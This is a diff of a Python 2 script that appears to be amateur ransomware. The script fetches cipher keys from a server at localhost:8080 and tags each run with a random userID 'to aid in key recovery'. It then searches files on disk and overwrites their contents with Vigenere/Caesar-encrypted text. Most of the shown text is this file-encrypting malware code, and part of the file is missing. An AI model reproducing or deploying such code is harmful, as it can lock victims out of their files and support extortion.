@@ -1,14 +1,13 @@
-import vigenerCipher, RSACipher,CaesarCipher2, os,subc, urllib2, urllib
+import vigenerCipher,CaesarCipher2, os,subc, urllib2, urllib
 from random import choice
-from RSACipher import generateKey
 from string import ascii_uppercase
-
-mykeys =''
-enc1 =''
+# store key as global var so we can use it throughout the program
+mykeys ='' 
+# get random keys from server
 def GenerateKeys():
     
- # get keys from  server 
-    
+ 
+        #send back random userID to aid in key recovery
     url = 'http://localhost:8080'
     userID = ''.join(choice(ascii_uppercase) for i in range(5))
     data = urllib.urlencode({'userID'  : userID})
@@ -24,12 +23,12 @@ def GenerateKeys():
 
 def controller():
     
-    enc =  SearchnEncrypt()
+     SearchnEncrypt()
     
    
     return
     
-   # print dec1
+   
    
 def productCipher(message,keys):
     
@@ -43,6 +42,8 @@ def productCipher(message,keys):
     
     
     return encryptS 
+
+
 def decryptCipher(encryptS,keys):
     
     keys = keys.split(',')
@@ -92,7 +93,7 @@ def searchnDecrypt():
             fo = open(combination,'r+')
             
             
-          #  str = fo.read()
+          
             print(file)
             
             message1 = fo.read()
@@ -103,8 +104,7 @@ def searchnDecrypt():
 
             fo.write(enc1)
             
-         #   decryp = CaesarCipher2.caesar('decrypt',encyrp,55)
-          #  fo.write(decryp)
+      
             
             fo.close()
             
@@ -116,6 +116,5 @@ def searchnDecrypt():
     
 GenerateKeys()  
 controller()
-print decryptCipher(enc1, mykeys)
 
 
